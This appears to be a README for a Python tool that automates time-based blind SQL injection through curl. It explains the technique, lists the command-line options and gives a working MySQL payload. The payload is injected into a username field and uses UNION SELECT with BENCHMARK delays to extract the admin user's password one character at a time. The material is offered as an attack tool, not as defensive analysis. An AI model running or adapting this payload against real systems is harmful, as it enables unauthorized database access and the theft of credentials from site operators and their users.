# curl-blind-sql-injection
Automate a timebase blind sql injection with curl

##Timebase blind sql injection

This type of SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. Using this method, an attacker enumerates each letter of the desired piece of data using the following logic:

If the first letter of the first database's name is an 'A', wait for 10 seconds.

If the first letter of the first database's name is an 'B', wait for 10 seconds. etc.

##Usage

```
usage: curl-blind-sql-injection.py [-h] [-P P] [-I I] [-l LATENCY]
                                   [-s START_CHAR] [-e END_CHAR]
                                   CURL_REQUEST

Curl based blind-sql-injection execute the given curl request and replace some
of it's part to induce the content of a chosen field

positional arguments:
  CURL_REQUEST          the raw curl request.

optional arguments:
  -h, --help            show this help message and exit
  -P P, --template-character-position P
                        the tag to be replaced for the character position.
                        DEFAULT {p}
  -I I, --template-character-integer I
                        the field tag to be replaced for the integer
                        comparison. DEFAULT {i}
  -l LATENCY, --latency LATENCY
                        lower this value when request is fast
  -s START_CHAR, --start-char START_CHAR
                        at what char we start (inclusive)
  -e END_CHAR, --end-char END_CHAR
                        at what char we end (inclusive)
```

##Example

###MySql timebase blind sql injection

This sample will exploit an sql injection found in a field named username.

```
./curl-blind-sql-injection.py --latency 0.6 "curl domain --data \"username=a' UNION ALL SELECT
IF(ASCII(SUBSTRING((SELECT password FROM admin WHERE username
='admin'),{p},1)){i},1,BENCHMARK(1500000,MD5(1)));#\" --more-curl-options"
```
